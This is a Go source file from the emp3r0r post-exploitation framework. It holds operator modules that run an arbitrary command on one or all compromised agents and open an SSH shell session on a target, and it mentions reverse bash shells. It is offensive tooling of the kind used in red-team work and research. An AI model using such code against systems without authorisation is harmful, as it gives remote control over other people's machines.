package modules

import (
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// RShellStatus stores errors from reverseBash
var RShellStatus = make(map[string]error)

// moduleCmd exec cmd on target
func moduleCmd() {
	// check if ActiveModule and Options are valid
	if live.ActiveModule == nil || live.ActiveModule.Options == nil {
		logging.Errorf("moduleCmd: ActiveModule or Options is nil")
		return
	}

	// send command
	execOnTarget := func(target *def.Emp3r0rAgent) {
		if live.AgentControlMap[target] == nil || live.AgentControlMap[target].Conn == nil {
			logging.Errorf("moduleCmd: agent %s is not connected", target.Tag)
			return
		}
		cmdOpt, ok := live.ActiveModule.Options["cmd_to_exec"]
		if !ok {
			logging.Errorf("Option 'cmd_to_exec' not found")
			return
		}
		err := CmdSender(cmdOpt.Val, "", target.Tag)
		if err != nil {
			logging.Errorf("moduleCmd: %v", err)
		}
	}

	// find target
	target := live.ActiveAgent
	if target == nil {
		cmdOpt, ok := live.ActiveModule.Options["cmd_to_exec"]
		if !ok {
			logging.Errorf("Option 'cmd_to_exec' not found")
			return
		}
		logging.Warningf("emp3r0r will execute `%s` on all targets this time", cmdOpt.Val)
		for _, per_target := range live.AgentList {
			execOnTarget(per_target)
		}
		return
	}

	execOnTarget(target)
}

// moduleShell set up an ssh session
func moduleShell() {
	// find target
	target := live.ActiveAgent
	if target == nil {
		logging.Errorf("Module shell: target does not exist")
		return
	}

	// options
	shellOpt, ok := live.ActiveModule.Options["shell"]
	if !ok {
		logging.Errorf("Option 'shell' not found")
		return
	}
	shell := shellOpt.Val

	argsOpt, ok := live.ActiveModule.Options["args"]
	if !ok {
		logging.Errorf("Option 'args' not found")
		return
	}
	args := argsOpt.Val

	portOpt, ok := live.ActiveModule.Options["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	port := portOpt.Val

	// run
	err := SSHClient(shell, args, port, false)
	if err != nil {
		logging.Errorf("moduleShell: %v", err)
	}
}
